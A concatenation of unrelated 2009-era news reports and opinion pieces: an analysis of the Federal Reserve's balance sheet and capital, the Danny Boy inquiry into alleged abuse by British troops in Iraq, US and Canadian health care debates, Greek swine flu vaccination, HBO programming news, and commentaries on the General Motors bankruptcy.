The total currency outstanding volumes fluctuated slightly with changes in the demand for cash .
Cash demanded by the public includes foreign demand and what was needed in automated teller machines ( ATMs ) .
Currency is effectively a permanent source of funding for the Fed , and its maturity is nearly infinite .
Until just recently , none of the reserve deposits paid interest .
Of course , cash pays no interest .
So the currency component of the Fed ’s balance sheet has a zero cost of carry .
Today , the Fed holds a wide range of loans and other assets acquired as part of its efforts to combat the financial crisis .
The financing of those assets has also changed .
As a result , the Fed ’s balance sheet is not so simple and is now exposed to a significant amount of both credit and interest - rate risk .
The Fed just released a consolidated balance sheet as of May 27 , as part of a new monthly report on “ Credit and Liquidity Programs . ”
1
The report lists consolidated Federal Reserve System assets at $ 2.082 trillion and total capital at $ 45 billion .
This implies a capital - to - assets ratio of 2.16 % . , which would also be the Fed ’s tangible equity capital ratio .
Keep in mind that the Fed ’s target tangible equity capital ratio for banks is 4 % .
Of course , the Fed ’s tangible equity capital ratio is n’t its risk - based capital ratio .
If the Fed were a bank , the government securities portion would require a 0 % risk weight .
That means no capital would have to be held against those assets .
As a bank , the Fed ’s mortgage - related holdings would require a 50 % risk weight under current standards .
If one considers all the other lending of the Fed to be equivalent to assets that require a 100 % risk weight , the Fed , as a bank , would have a Tier 1 capital ratio of approximately 4.9 % .
Now , we know that the Fed is committed to expanding its mortgage portfolio to about $ 1.2 trillion from its current size of $ 428 billion .
This would increase the Fed ’s risk - based assets by another $ 386 billion and reduce its Tier 1 capital ratio to 3.6 % , assuming a 50 % risk weight .
The Fed has virtually no options to increase its capital account , except to retain more of its earnings rather than return those funds to the Treasury .
The Fed can not engage in a stock offering .
Its current capital base provides precious little margin to absorb any additional losses on its AIG - and Bear Stearns - related portfolios or to deal with substantial write downs in asset values .
Furthermore , there is virtually no cushion to absorb the capital losses that might have to accompany any upward movement in interest rates .
An increase in inflation expectations may require the Fed to raise policy rates needed to fight inflation .
This could trigger losses on long - term , lower - rate assets as the Fed ’s attempts to exit from its quantitative easing strategy .
Finally , comparing the published financial statements in the Fed ’s H.1 report with its new monthly disclosures on its lending programs suggests that the Fed has not yet recognized the embedded losses in the Maiden Lane portfolios in its capital account .
Currently , those portfolios are under water by $ 13 billion .
Loss recognition would reduce the Fed ’s estimated capital - to - total - assets ratio to 1.5 % and reduce its estimated Tier 1 capital ratio to 3.5 % .
Should the Fed ’s mortgage related assets expand to their targeted level and Maiden Lane losses be recognized , this combination would reduce its Tier 1 capital ratio to 2.5 % .
It is hard to believe that in today ’s environment mortgage loans and mortgage - related assets would be regarded as half as risky as traditional bank lending .
If mortgage loans were considered on par with commercial and industrial loans , then the Fed ’s Tier 1 capital ratio would be about 3.9 % without recognition of these losses and about 2.8 % after recognizing the embedded Maiden Lane losses .
In short , by its own standards , the Fed is arguably not adequately capitalized and would be perilously close to being turned over to the FDIC – if the Fed were a bank .
This view of the Fed ’s capital adequacy is obviously somewhat tongue –in cheek , but the issues raised are important for two reasons .
First , possible asset sales have featured prominently in the exit strategy that the Fed has put forward as a means to reduce the outstanding liquidity it had injected into markets previously .
Secondly , the Fed has accumulated a much larger portfolio of longer - term Treasuries and mortgage - related and other longer - term assets whose liquidity may be problematic and whose changes in market value may be substantial if longer - term interest rates increase .
( Note to readers .
What follows is a more technical discussion of the Fed ’s balance sheet and risk exposure . )
The Fed ’s report provides some information on the maturity of those assets .
Over half of its outstanding loans and other asset holdings have a maturity of over one year , and over 32 % have a maturity of five years or more .
This means that the durations of the Fed ’s assets have increased substantially during the crisis period and are likely to increase even more as its mortgage - related holdings continue to expand .
The increase in duration plus expansion of its mortgage - related assets to potentially $ 1.2 trillion means that the Fed ’s interest - rate and credit risk exposure has increased substantially .
This would not necessarily be a problem because of the unusual nature of the Fed ’s liability structure , which until recently consisted mainly of approximately infinite - duration non-interest - bearing liabilities ( namely currency ) .
However , this too has changed as the Fed has responded to the financial crisis .
In particular , the Fed ’s liabilities are now nearly half overnight reserve deposits held by member banks and half in Federal Reserve Notes .
Reserve deposits have a near - zero duration , while Federal Reserve Notes have nearly an infinite duration .
Thus the Fed ’s liability structure is a “ barbell ” shape whose average portfolio duration has shortened significantly at the same time the duration of its assets has increased .
Assuming the mortgage - related portion of the portfolio continues to expand as promised and is financed through the creation of bank reserves , the trend towards a widening asset / liability mismatch will persist .
If the Fed were to expand its mortgage holdings to $ 1.2 trillion and finance it with short - term reserves , then short - term liabilities would account for over 60 % of its liabilities .
At some point in the process , the risk of even small changes in interest rates will wipe out the Fed ’s capital if it marks assets to market .
For example , if one assumed an average asset duration of five years and that duration of its liabilities shrank as low as eight years , then back - of - the - envelope calculations using McCauley duration suggest that a 1 % increase in interest rates would reduce the Fed ’s capital by 38 % if assets were marked to market .
2
If the Fed were a bank , this would be sufficient to trigger liquidation by the FDIC .
The first point of this illustration is simply that asset sales or other policies to exit from the Fed ’s quantitative easing strategy have a risk if interest rates move by even a relatively small amount .
This poses significant risks to the Fed ’s capital structure and the public ’s perception of its solvency .
The second point is that the duration calculation has suddenly become an important test of the Fed ’s ability to achieve an exit strategy .
The Fed will remain technically solvent as long as the duration of its liabilities is substantially greater than the duration of its assets .
As a practical matter , because of their prepayment feature , mortgage instruments complicate the calculation of their duration , which increases as interest rates rise , other factors being equal .
This means that policies designed to fight inflation by raising interest rates will also narrow the gap between the duration of the Fed ’s assets and liabilities and increase the risk that its capital will fall below acceptable levels .
An examination of the Fed ’s balance sheet suggests that the Fed is getting close to failing this test .
Third , because of its interest - rate risk exposure and its likely impact on Fed exit strategies and credibility , we expect that there will be great interest in the Fed ’s balance sheet duration .
If the Fed truly seeks transparency and discloses its internal calculations of duration , it will also have to estimate how the duration of the mortgage portfolio changes as interest rates change and what impact this will have on its capital structure .
So far we have not seen any Fed computations of duration made public .
One final note is needed to be technically correct .
If the Fed were a bank and if the Fed were marking its assets and liabilities to market , it would also have to mark its gold hoard to market .
Such a change would add about $ 150 billion to the carried book value of the Fed ’s gold .
That addition could also be reflected in the Fed ’s capital account .
It would also open the Fed to scrutiny as the gold price fluctuated .
And it would certainly enhance the market ’s view of precious metals .
The authors are not advocating a revaluation of gold .
In our view , gold trades just like any other commodity .
It has no place in a fiat - currency world of monetary policy making .
Any one who wishes to use it as a hedge or a store of value may do so on their own .
Furthermore , basing US monetary policy on revaluing gold on the Fed ’s balance sheet borders on lunacy .
Remember , the largest hoards of gold are found in the ground in Russia and South Africa .

Allegations that British soldiers murdered and mutilated 20 Iraqi civilians are to be fully investigated after it emerged ministers had attempted to warn Tony Blair about damaging evidence of the ill - treatment of battlefield prisoners five years ago .
The startling revelation in the High Court yesterday led to the Government withdrawing its objection to a judicial inquiry into the alleged massacre after the battle of " Danny Boy " involving British forces near Basra in May 2004 .
Government lawyers now say that shortly afterwards , the Armed Forces Minister had written a draft confidential letter , addressed to No 10 , which referred to complaints made by the International Committee of the Red Cross in connection with the alleged ill - treatment of detainees held by the army after the battle .
The discovery of the existence of the correspondence led the Government to withdraw its defence to a judicial inquiry into the alleged massacre and abuse of the Iraqis .
Lawyers for the Iraqis and the families of those who died said the case raised allegations that were among the most serious in modern British military history .
Lord Justice Scott Baker , the senior judge in the High Court hearing , was yesterday scathing about the Government 's conduct of the case .
" The [ court ] procedures [ so far ] have been a complete waste of time and of vast expense ... "
The judge also made clear his concerns about the " credibility " of the public interest immunity system which allows the Government to stop secret evidence being disclosed in court cases .
Clive Lewis QC , for the Government , said an email from 2004 , which included the draft letter written to the Prime Minister 's office warning of the Red Cross report , had only been discovered last week on a " mislabelled " CD located in a Whitehall cupboard .
The document also included suggested " lines " that ministers could take should the allegations of abuse , including injuries resulting from bayonets , become public .
In the letter , Adam Ingram , the then armed forces minister , says : " The main concern of the International Committee of the Red Cross ( ICRC ) involved the alleged mistreatment of 9 internees who were brought to the Divisional Temporary Detention Facility ( DTDF ) following a contact incident near Al Majaar Al Kabir on 14 May .
Most of these internees have injuries they allege occurred during their arrest ( prior to arrival at the DTDF ) .
In the opinion of the ICRC doctor , the injuries that these internees had sustained to their wrists indicated that excessive force was used to manhandle the prisoners post apprehension . "
Mr Ingram 's letter adds : " The ICRC doctor also indicated that some of the prisoners had received injuries to one side of the face , which would have likely occurred in a situation where the internee was held down .
At the meeting the ICRC formally requested that an investigation was launched into these allegations . "
Rabinder Singh QC , for the Iraqis , accused the Government 's key witness , Colonel Dudley Giles , of " not telling the truth " about the evidence .
Mr Singh said documents disclosed only last week demonstrated that all nine detainees held by the British after the battle complained to the Red Cross about being ill - treated after arrest .
Somebody seemed to have assured ministers that the Royal Military Police Special Investigation Branch had launched an investigation into the allegations .
Yet the court heard that the claimants did not make such complaints to the Red Cross and therefore there was no need for an investigation .
Phil Shiner , the lawyer who has brought these claims of military abuse to the UK courts , said he welcomed the inquiry decision .
Mazin Younis , of the Iraqi League , said : " The Iraqi families who believe their loved ones were tortured to death have been waiting for such an historical moment .
Now ... we will do our utmost to uncover the story ... that led to the deaths of their sons . "
In the case before the court yesterday six Iraqis were asking the court to order an independent public inquiry into accusations that soldiers may have killed up to 20 captives held after the gun battle in southern Iraq .
In a 20 - day hearing , lawyers for the Iraqis presented evidence they said supported their contentions that captives were taken to a British base , Camp Abu Naji , and tortured , murdered and their bodies mutilated .
The Ministry of Defence denies that British soldiers were responsible for any ill - treatment of the Iraqis .
But yesterday the Defence Secretary Bob Ainsworth conceded at the High Court that there was insufficient information before the judges for them to be able to make a fully - informed judgment on the allegations .
Since the start of the High Court hearing , MoD lawyers have argued that the 20 who died were killed during the fighting and an independent and effective investigation has already been held by the Royal Military Police .
Armed Forces Minister Bill Rammell said after the adjournment : " It is clear ... that no - one was murdered or ill - treated by British forces .
It is also clear British forces did not mutilate corpses on the battlefield , and there is independent expert testimony to support this .
However ... we regret that we have failed to provide the court with timely and sufficient disclosure of information to enable them to determine the facts . "
Long road to justice ?

HEALTH CARE OVERHAUL HEALTH CARE OVERHAUL Administration : Hurdles remain | Sebelius , Deparle ready to tackle overhaul Congress : Hoyer not thrilled with Obama plan | Enzi says this is year for legislation Competing interests :
White House hold summit |
Many groups have stake in overhaul
By the numbers : 1 in 5 workers uninsured |
Wait times getting longer HEALTH UPDATES ON TWITTER HEALTH UPDATES ON TWITTER Business groups reacted warily Sunday to the Senate 's first stab at overhauling the nation 's health care system , a rift that could complicate President Obama 's goal of achieving bipartisan support for his top domestic priority .
Meanwhile , a key Republican in the health care debate said via Twitter on Sunday that he thought Obama had " nerve " to pressure Congress for quick action while he was traveling in Europe .
After weeks of behind - the - scenes negotiations and friendly exchanges , debate over health care appeared to fall into familiar territory after a draft proposal by the Senate Health , Education , Labor and Pensions Committee began circulating late last week .
" It 's nice to have all these bipartisan meetings , " said Julius Hobson , a Washington lobbyist for physicians and hospitals , " but when you get down to the actual writing , that 's where it ( can ) start to fall apart . "
Criticism of the draft comes during what Obama has called a " make or break " time for health care .
The president has said he hopes to sign legislation by October , but business groups say provisions of the draft bill are too far - reaching for broad support .
" If this were the bill , I think we would be compelled to oppose it , " said Neil Trautwein , vice president of the National Retail Federation .
Among the potential stumbling blocks :
• The measure includes a government - run insurance program that would compete with private insurance companies , an idea that Obama supports but that Republicans , including Senate Minority Leader Mitch McConnell of Kentucky , have opposed .
• Most employers would be required to provide health insurance to workers or pay a penalty .
" We 're trying to get that out of there , " said Hank Cox , a spokesman for the National Association of Manufacturers .
• The cost of expanding health coverage , which could be more than $ 1 trillion , has become a key issue .
The draft does not address how changes would be paid for .
" It 's no secret that the biggest sticking points will be the so - called public option and the employer mandate , " said Randel Johnson , a vice president of the U.S. Chamber of Commerce .
Anthony Coley , a spokesman for Senate committee Chairman Edward Kennedy , D - Mass . , called the proposal " a draft of a draft . "
The Senate Finance Committee is writing a separate bill that business groups such as the chamber expect will be less sweeping .
Obama has pushed hard for the public - financed option in recent days , including in a letter last week to Democratic senators .
" The president and many others believe that the availability of a public option alongside private options … is a positive thing , " White House adviser David Axelrod said on CBS ' Face the Nation .
Sen. Chuck Grassley of Iowa , the top Republican on the Senate Finance Committee , said via Twitter that Obama had nerve to call for prompt action while " sightseeing in Paris . "
White House spokesman Reid Cherlin said Obama , who returned to Washington on Sunday , is " gratified that the Senate is working hard " on health care and that he looks forward to working with members " upon his return from the commemoration of Allied heroism at D - Day . "

VANCOUVER , British Columbia ( Reuters ) - Canadian physician Robert Ouellet is tired of hearing Canada ’s healthcare system cast as the boogeyman in the vitriolic U.S. political debate over healthcare reform .
Critics of President Barack Obama ’s reform drive have accused him of trying to adopt the Canadian system of public healthcare funding , which they say endangers patients with lengthy waits for medical care .
Some advertisements feature Canadian citizens who say they were denied needed medical care or forced to seek treatment at their own expense in the United States because Canada ’s system was too slow to respond .
While Ouellet , president of the Canadian Medical Association , admits that Canada ’s system has its flaws , including excessive wait times for some medical services , he denies the accusation that it puts lives at risk .
“ To say that the system is a complete failure is not fair .
When people go to the hospital they get good quality medical care .
...
People are not dying on the street , ” said Ouellet , who practices medicine in the French - speaking province of Quebec .
Canada ’s “ national ” system is actually a set of provincial and territorial insurance systems governed by a federal law that says coverage is universal , and ensures that taxpayers , not patient fees , pay for primary medical services so everyone can afford them ..
“ It ’s 14 systems , ” Ouellet said .
CULTURAL GAPS
Canadians are quick to cite healthcare as a cultural difference with their southern neighbor , describing it as inconceivable that 47 million Americans -- more than Canada ’s population -- live without health insurance .
“ It ’s seen as something that separates us from the United States , ” said Mike Luff , a spokesman for the National Union of Public and General Employees .
The attacks on Canada ’s healthcare are also “ ironic ” because “ Obama ’s plan does n’t come close to what the system is in Canada , ” Luff said .
White House - backed Bills now making their way through the U.S. House and Senate would overhaul rules for private health insurers , and offer them competition in the form of a government - run health program .
Private health insurance is also available in Canada , as a supplement to the government - funded insurance system , and Canadians face the same television advertisements as Americans about the risks of not having it .
Canadians can also pay private clinics for some procedures to avoid waiting , but major medical treatments must be done through the government - funded system .
Ouellet says each country has something to learn from the other about health care , and should also take lessons from European countries that provide universal care while reducing both costs and wait times .
Dr. Brian Day , a past CMA president who has advocated for a bigger private - sector role in Canada , is also dismayed that Americans and Canadians focus on one another and ignore the rest of the world when discussing healthcare reform .
“ Clearly the Canadian system has problems , but the United States has more problems .
...
Neither country is giving value for money , ” Day said .
The Canadian government has stayed quiet on the U.S. debate , but it may have no choice but to speak out if the Canadian public grows more upset at what it sees as unfair U.S. attacks on a source of national pride , said Mario Canseco , of the polling firm Angus Reid Strategies .
“ Sooner or later someone from the federal government is going to have to stand up and say leave us out of this , ” said Canseco .
Canadian politicians may also be leery of involvement in the U.S. debate because they recognize if the Americans reform their system it could force Canada to address its own healthcare problems , according to Ouellet .
“ It ’s good to have someone like President Obama who wants to fix things , ” Ouellet said .

ATHENS , July 31 ( Reuters ) - Greece will vaccinate its entire population of 12 million against the H1N1 swine flu pandemic which has swept around the world in weeks , killing hundreds of people , the country ’s health minister said on Friday .
The Mediterranean country , which receives about 15 million tourists every year , has confirmed more than 700 swine flu cases and no deaths , but world health experts say the true number of cases globally is far higher as only a few patients get tested .
“ We decided that the entire population , all citizens and residents , without any exception , will be vaccinated against the flu , ” Health Minister Dimitris Avramopoulos said after a ministerial meeting .
Greece has already earmarked 40 million euros for vaccines and has placed orders with Novartis NONV.VX , Glaxo GSK.L and Sanofi SASY .
PA for 8 million vaccine doses , to be received gradually by January .
Vaccine experts say people will likely need two doses of vaccine to be protected from H1N1 swine flu , so Greece would need a total of 24 million doses to vaccinate its entire population .
Other countries are taking similar steps .
“ Greece will order 16 million more doses from the same companies in the future , ” a health ministry official who declined to be named told Reuters .
“ We are only waiting for the European Union ’s approval to start vaccinating everyone . ”
The European Medicines Agency has begun reviewing pandemic flu vaccines under development , aiming to get them approved before the flu season starts , sometime in September .
The health ministry official said children , the elderly and ailing would be the first to be vaccinated .
About 800 people have died worldwide since the outbreak of the flu in April .

TCA Update : HBO Executive Session
The HBO executive session with Michael Lombardo ( President , Programming Group and West Coast Operations ) and Richard Plelpler ( Co- President ) just wrapped up , and here were the highlights :
* Before Plepler and Lombardo took the stage , we were treated to the trailer for the network ’s new 10 - hour miniseries , “ The Pacific , ” produced by Tom Hanks , Steven Spielberg , and Gary Goetzman .
Let ’s just go ahead and give the Emmy now , shall we ?
* “ True Blood , ” “ Hung , ” and “ Entourage ” will all be coming back for new seasons next summer .
* Conversations are underway to potentially bring back “ The No. 1 Ladies ’ Detective Agency . ”
* Neither was willing to offer up any information about how Evan Rachel Wood would look as the vampire queen at the end of the second season of “ True Blood , ” for fear that they would suffer some horrible fate at the hand of Alan Ball .
They did , however , assure us that surprises are in store , and that it totally delivers .
* “ Little Britain USA ” is not coming back , but they ’re talking about bringing creators Matt Lucas and David Walliams back for some specials .
It ’s still in the development stage , but the intent is to come back with a whole new cast of characters and a whole new approach to their television appearance .
In short , they will be back on HBO , though whether it will be at the end of next year or later remains to be seen .
* Season 2 of “ Eastbound and Down ” will begin shooting it sometime at the end of winter or the beginning of spring , and it will air next year .
* David Simon ’s new series , “ Treme , ” will be on the air next April , fingers crossed .
The current intention is for “ The Pacific ” to premiere mid-March , and , at the end of its run , ‘ ” Treme ” will begin .
* The pilot just wrapped for Martin Scorcese ’s “ Boardwalk Empire , ” and they are anxiously awaiting a cut from Marty so that the series can receive a green light .
Provided it ’s as good as they ’re presuming it will be…and , thus far , “ everything we ’ve seen is fantastic , big , everything we hoped it could be ” … their fingers are crossed that a pick - up is imminent .
* As for Season 3 of “ Flight of the Conchords , ” the official word is , “ When they ’re ready , we ’re ready . ”
* They have begun receiving episodes for Season 2 of “ The Life & Times of Tim , ” and they describe them as “ funnier than the first , ” but they have n’t yet figured out where they want schedule the show .
They do , however , have an upcoming series that could fit the bill nicely …
* They ’ve ordered an animated show from Ricky Gervais and Stephen Merchant , based on their long - running series of podcasts .
I ’m saying it right here : the time is right for Karl Pilkington mania to grip the States !
* Although the histrionics of Jerry Rice probably did n’t help things any , the big reason that the Bengals are the focus of this season of “ Hard Knocks ” rather than the Cowboys is that the network wanted to open up a new team to the audience and show a different organization and the habits and attitude of that team .
* Season 4 of “ Big Love ” is scheduled to kick off in January .
* Season 3 of “ In Treatment ” is something they ’re trying to put together , but given that the show was adapted from an Israeli series that only ran for two seasons , they ’d have to create all - new scripts for a third season .
Still , it ’s a good sign that Gabriel Byrne is “ very interested ” in returning .
* And , lastly , they are forever trying to figure out a way to extend the length of Bill Maher ’s seasons , in order to give him more time on the air .
Whether that ’s a good thing or not , you be the judge .
To create his cast paper sculptures , Allen Eckman first mixes an acid - free paper pulp in the studio hydro - pulper from two raw stocks — cotton and abica .
Then the pulp is cast into molds which Allen makes from original clay sculptures .
The paper is then pressed under vacuum pressure in the mold where most of the water is extracted at the same time .
The drying process is completed by evaporation while the paper is still in the mold .
After the dry and hard casts are removed from the molds the exclusive process of chasing cast additions , cast alterations , sculpting in paper and detailing begins .

The greatest tragedies among many in the collapse and bankruptcy of General Motors ( GM ) concern what is not happening .
There are those solutions to GM 's problems not being considered by Obama 's administration .
There are the solutions not being demanded by the United Auto Workers Union ( UAW ) .
There are all the solutions not even being discussed by most left commentators on the disaster .
Finally there are crucial aspects of GM 's demise not getting the attention they deserve .
Let 's start with an example of the last .
For 50 years , the world market for automobiles has grown spectacularly .
The company best positioned to have ridden that rising tide to success was GM , the global market leader for most of that time .
Instead , GM failed catastrophically .
Those responsible , who planned , adjusted , and competed poorly , have a name .
They are the corporation 's Board of Directors : the handful of individuals chosen by and responsible to the handful of major GM shareholders .
That Board and those shareholders proved across decades that they lacked the understanding , vision , and flexibility to succeed .
A rising tide is supposed to lift all boats , but GM 's captains managed to sink its boat .
President Obama promises not to interfere in decisions of the next post - bankruptcy GM Board of Directors despite the government being GM 's largest shareholder .
He further promises quickly to sell the government 's shares to " re-privatise " GM ( he promises the same for collapsed banks , insurance companies , and other corporations revived by infusions of taxpayer money ) .
Obama 's plan returns decision - making to the same Boards who just brought us the worst economic crash in 75 years .
GM 's bankruptcy cuts employees and the wages and benefits of remaining workers .
That will further damage already reeling Midwestern states dependent on the auto industry .
Were our culture less subservient to capitalist interests and mentalities , the government would have developed -- years ago , but certainly during the last crisis - ridden year -- major plans to maintain employment and the regional economy by converting closed auto plants into , for example , production of ecologically sensitive mass transportation systems .
That would be a growth industry as many regions seek to reduce the ecological damage from private automobile - based transportation systems .
Obama supporters talk about such things but his administration does not do them .
Likewise the government might have developed programs to utilise closed plants , warehouses , and showrooms to help laid - off workers organise and operate their own enterprises .
For a tiny fraction of the billions given to banks , the government could finance such workers using their skills , their largely untapped managerial capabilities , and their knowledge of and commitment to local needs .
This , too , is not happening .
The UAW no doubt accepted the horrific terms of Obama 's GM bankruptcy plan because otherwise bankruptcy threatened even worse for workers .
It was " the best deal possible in the circumstances . "
However , those circumstances could have been different if the UAW and its allies had fought for them earlier .
Suppose , for example , that the UAW , other unions , and the political left had fought for and won laws obligating the government to finance massive investments in new enterprises ( producing new things and organised in new ways ) whenever private capitalists laid off workers in large numbers .
Then the UAW would not have had to accept the sort of horrific deal Obama and GM just pushed on them .
UAW workers would have refused because they would have known the government was obligated to provide them with new jobs , enterprises , and new supports if a bankrupt GM fired them .
The government 's costs of bailing out GM through bankruptcy would have had to include the expenses of providing the new jobs and supports to fired workers .
The government might then have put heavy pressure on GM for a bailout with many fewer lost jobs .
In any case , if such laws had been won , UAW members laid off in a bankruptcy would not face unemployment nor would their communities face the devastation now underway .
The point is that nothing in the Obama - GM tragedy was necessary or unavoidable .
The political struggles not undertaken and the laws not passed created the circumstances that drove UAW capitulation to the Obama bankruptcy as their least awful option .
Knee - jerk apologists for the status quo are wrong to dismiss talk of what might have been .
What might have been -- but was not won or even fought for -- determines today 's mass sufferings as the GM tragedy unfolds .
Without past labor - left alliances struggling for laws such as the example above describes , the way was cleared for GM and Washington to devise a choice for the UAW that made its members losers either way .
GM played by the capitalist system 's rules .
First , it always aimed to profit by driving its employees as hard as possible and paying them as little as it could .
Second , GM secured the US market for its cars and trucks by blocking the development of high - quality mass transportation here .
Auto workers fought , through the UAW , and eventually won decent wages and benefits that became goals for all other unions and workers for decades .
US citizens ' efforts to get quality mass transportation failed ( hence Europe 's far superior mass transport systems ) .
Under capitalism 's rules , the decent wages and working conditions won by the UAW provoked GM to strike back by moving production where wages and benefits were lower .
Thus GM 's vehicle production inside the US peaked in the late 1970s ( over 6 million ) and has since fallen steadily ( over 2 million in 2008 ) .
GM profited more from the much cheaper labor in China , Brazil , India , and elsewhere .
The big losers have been the hundreds of thousands of laid - off , retired , and the few still employed auto workers , and everyone in Detroit and all the other consequently devastated communities .
This week 's GM bankruptcy creates still more losers to " rebuild GM 's profitability . "
Workers who struggle successfully for decent wages and working conditions always find that the system strikes back .
That 's how capitalism works , how capitalists profit .
Republicans and Democrats alike proudly serve that system .
And the lesson for GM and other workers is ...?

June 1 , 2009 -- MichaelMoore.com --
I write this on the morning of the end of the once - mighty General Motors .
By high noon , the president of the United States will have made it official : General Motors , as we know it , has been totalled .
As I sit here in GM 's birthplace , Flint , Michigan , I am surrounded by friends and family who are filled with anxiety about what will happen to them and to the town .
Forty per cent of the homes and businesses in the city have been abandoned .
Imagine what it would be like if you lived in a city where almost every other house is empty .
What would be your state of mind ?
It is with sad irony that the company which invented " planned obsolescence " -- the decision to build cars that would fall apart after a few years so that the customer would then have to buy a new one -- has now made itself obsolete .
It refused to build automobiles that the public wanted , cars that got great gas mileage , were as safe as they could be , and were exceedingly comfortable to drive .
Oh -- and that would n't start falling apart after two years .
GM stubbornly fought environmental and safety regulations .
Its executives arrogantly ignored the " inferior " Japanese and German cars , cars which would become the gold standard for automobile buyers .
And it was hell - bent on punishing its unionised workforce , lopping off thousands of workers for no good reason other than to " improve " the short - term bottom line of the corporation .
Beginning in the 1980s , when GM was posting record profits , it moved countless jobs to Mexico and elsewhere , thus destroying the lives of tens of thousands of hard - working Americans .
The glaring stupidity of this policy was that , when they eliminated the income of so many middle - class families , who did they think was going to be able to afford to buy their cars ?
History will record this blunder in the same way it now writes about the French building the Maginot Line or how the Romans cluelessly poisoned their own water system with lethal lead in its pipes .
So here we are at the deathbed of General Motors .
The company 's body not yet cold , and I find myself filled with -- dare I say it -- joy .
It is not the joy of revenge against a corporation that ruined my hometown and brought misery , divorce , alcoholism , homelessness , physical and mental debilitation , and drug addiction to the people I grew up with .
Nor do I , obviously , claim any joy in knowing that 21,000 more GM workers will be told that they , too , are without a job .
But you and I and the rest of America now own a car company !
I know , I know -- who on earth wants to run a car company ?
Who among us wants $ 50 billion of our tax dollars thrown down the rat hole of still trying to save GM ?
Let 's be clear about this :
The only way to save GM is to kill GM .
Saving our precious industrial infrastructure , though , is another matter and must be a top priority .
If we allow the shutting down and tearing down of our auto plants , we will sorely wish we still had them when we realise that those factories could have built the alternative energy systems we now desperately need .
And when we realise that the best way to transport ourselves is on light rail and bullet trains and cleaner buses , how will we do this if we 've allowed our industrial capacity and its skilled workforce to disappear ?
Thus , as GM is " reorganised " by the federal government and the bankruptcy court , here is the plan I am asking President Obama to implement for the good of the workers , the GM communities , and the nation as a whole .
Twenty years ago when I made Roger & Me , I tried to warn people about what was ahead for General Motors .
Had the power structure and the punditocracy listened , maybe much of this could have been avoided .
Based on my track record , I request an honest and sincere consideration of the following suggestions :
1. Just as President Roosevelt did after the attack on Pearl Harbor , the president must tell the nation that we are at war and we must immediately convert our auto factories to factories that build mass transit vehicles and alternative energy devices .
Within months in Flint in 1942 , GM halted all car production and immediately used the assembly lines to build planes , tanks and machine guns .
The conversion took no time at all .
Everyone pitched in .
The fascists were defeated .
We are now in a different kind of war -- a war that we have conducted against the ecosystem and has been conducted by our very own corporate leaders .
This current war has two fronts .
One is headquartered in Detroit .
The products built in the factories of GM , Ford and Chrysler are some of the greatest weapons of mass destruction responsible for global warming and the melting of our polar icecaps .
The things we call " cars " may have been fun to drive , but they are like a million daggers into the heart of Mother Nature .
To continue to build them would only lead to the ruin of our species and much of the planet .
The other front in this war is being waged by the oil companies against you and me .
They are committed to fleecing us whenever they can , and they have been reckless stewards of the finite amount of oil that is located under the surface of the earth .
They know they are sucking it bone dry .
And like the lumber tycoons of the early 20th century who did n't give a damn about future generations as they tore down every forest they could get their hands on , these oil barons are not telling the public what they know to be true -- that there are only a few more decades of useable oil on this planet .
And as the end days of oil approach us , get ready for some very desperate people willing to kill and be killed just to get their hands on a gallon can of gasoline .
President Obama , now that he has taken control of GM , needs to convert the factories to new and needed uses immediately .
2 . Do n't put another $ 30 billion into the coffers of GM to build cars .
Instead , use that money to keep the current workforce -- and most of those who have been laid off -- employed so that they can build the new modes of 21st century transportation .
Let them start the conversion work now .
3 . Announce that we will have bullet trains criss - crossing this country in the next five years .
Japan is celebrating the 45th anniversary of its first bullet train this year .
Now they have dozens of them .
Average speed : 165 mph .
Average time a train is late : under 30 seconds .
They have had these high speed trains for nearly five decades -- and we do n't even have one !
The fact that the technology already exists for us to go from New York to LA in 17 hours by train , and that we have n't used it , is criminal .
Let 's hire the unemployed to build the new high speed lines all over the country .
Chicago to Detroit in less than two hours .
Miami to DC in under seven hours .
Denver to Dallas in five and a half .
This can be done and done now .
4. Initiate a program to put light rail mass transit lines in all our large and medium - sized cities .
Build those trains in the GM factories .
And hire local people everywhere to install and run this system .
5 . For people in rural areas not served by the train lines , have the GM plants produce energy efficient clean buses .
6 . For the time being , have some factories build hybrid or all - electric cars ( and batteries ) .
It will take a few years for people to get used to the new ways to transport ourselves , so if we 're going to have automobiles , let 's have kinder , gentler ones .
We can be building these next month ( do not believe anyone who tells you it will take years to retool the factories -- that simply is n't true ) .
7. Transform some of the empty GM factories to facilities that build windmills , solar panels and other means of alternate forms of energy .
We need tens of millions of solar panels right now .
And there is an eager and skilled workforce who can build them .
8. Provide tax incentives for those who travel by hybrid car or bus or train .
Also , credits for those who convert their home to alternative energy .
9 . To help pay for this , impose a two - dollar tax on every gallon of gasoline .
This will get people to switch to more energy saving cars or to use the new rail lines and rail cars the former autoworkers have built for them .
Well , that 's a start .
Please , please , please do n't save GM so that a smaller version of it will simply do nothing more than build Chevys or Cadillacs .
This is not a long - term solution .
Do n't throw bad money into a company whose tailpipe is malfunctioning , causing a strange odor to fill the car .
One - hundred years ago this year , the founders of General Motors convinced the world to give up their horses and saddles and buggy whips to try a new form of transportation .
Now it is time for us to say goodbye to the internal combustion engine .
It seemed to serve us well for so long .
We enjoyed the car hops at the A&W .
We made out in the front -- and the back -- seat .
We watched movies on large outdoor screens , went to the races at NASCAR tracks across the country , and saw the Pacific Ocean for the first time through the window down Highway 1 .
And now it 's over .
It 's a new day and a new century .
The president -- and the UAW -- must seize this moment and create a big batch of lemonade from this very sour and sad lemon .
Yesterday , the last surviving person from the Titanic disaster passed away .
She escaped certain death that night and went on to live another 97 years .
So can we survive our own Titanic in all the Flint Michigans of this country .
60 % of GM is ours .
I think we can do a better job .
Youth hit hard by lack of jobs , school grants UNEMPLOYMENT

Youth hit hard by lack of jobs , school grants 1 / 9 Back to Gallery
Jordan Atkinson had all the trappings of a typical Marin County childhood .
He lived in a big house in Novato , played Pop Warner football , spent weekends with friends listening to hip - hop .
Now , three years out of San Marin High School , Atkinson is homeless , a casualty of the recession .
" I was spoiled .
I had a lot of things easy , " Atkinson said recently while drinking a smoothie at a Novato cafe , taking a break from job applications and college forms .
" Now , unless someone physically attacks me , it does n't feel like things could get much worse . "
Young people like Atkinson are among the hardest hit by the state 's soaring unemployment rate .
More than 18 percent of workers 16 to 24 are unemployed , a 70 percent jump from a year ago and the highest of any other group , according to the state employment office .
" What happens is , these kids can't find jobs , so they can't afford to go to school , and a lot of them end up homeless , staying with relatives or couch - surfing , " said Racy Ming , manager of the Marin Employment Connection , a county employment office .
" With Cal Grants drying up , what are these kids supposed to do ?
It 's shocking . "
MBA BY THE BAY : See how an MBA could change your life with SFGATE 's interactive directory of Bay Area programs .
